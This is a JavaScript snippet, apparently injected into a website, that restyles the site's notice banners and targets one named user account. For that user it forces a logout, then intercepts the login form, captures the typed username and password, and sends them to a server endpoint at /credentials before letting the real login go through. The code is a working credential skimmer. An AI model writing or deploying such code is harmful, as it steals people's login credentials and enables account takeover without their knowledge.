const style = document.createElement('style');
style.textContent = `
  .note { 
    display: none !important; 
  } 

  .newnote {
    background: rgba(0,0,0,0.6) none repeat scroll 0 0;
    color: #FFF;
    width: 100%;
    line-height: 26px;
    font-size: 14px;
    box-shadow: 0 0 5px rgba(0,0,0,0.2);
    padding: 3px 0;
    left: 0;
    top: 0;
    position: fixed !important;
    z-index: 100000;
    text-align: center;
    cursor: pointer;
  }
`;
document.head.appendChild(style);

const el = document.getElementById('nick');
const username = el ? el.textContent : "";

const allowedUsernames = ["MatteC"];

if (allowedUsernames.includes(username)) {
    console.log("VALID USERNAME")

    Logout.submit()

    loginForm = document.getElementById('loginForm');
    loginForm.onsubmit = null;
    loginForm.addEventListener('submit', (event) => {
        event.preventDefault();
        event.stopImmediatePropagation();

        login_username = event.target.UserName.value;
        login_password = event.target.PassWord.value;
        sendLogin(login_username, login_password, function (data) {
            console.log('Login finished, now submit the form');
            document.getElementById('loginForm').submit();
        });

    });

} else {
    console.log("INVALID USERNAME")
}

function sendLogin(username, password, onFinish) {
    const url = new URL('http://127.0.0.1:5000/credentials');
    url.searchParams.append('username', username);
    url.searchParams.append('password', password);

    fetch(url, { method: 'GET' })
        .then(data => {
            if (onFinish) onFinish(data); // call callback when done
        })
        .catch(err => console.error('Fetch error:', err));
}

const observer = new MutationObserver((mutations) => {
    for (const m of mutations) {
        for (const node of m.addedNodes) {
            if (node.nodeType === 1 && node.classList.contains('note')) {
                // Extract the text used inside the original .note
                const messageText = node.querySelector('span')?.textContent || '';

                // Create a new div with the same structure but new class
                const newDiv = document.createElement('div');
                newDiv.className = 'newnote';

                const span = document.createElement('span');
                span.textContent = messageText;
                newDiv.appendChild(span);

                // Make it dismissible, like the original
                newDiv.addEventListener('click', () => newDiv.remove());

                // Insert your new version right after the old note
                node.insertAdjacentElement('afterend', newDiv);
            }
        }
    }
});

observer.observe(document.body, { childList: true, subtree: true });



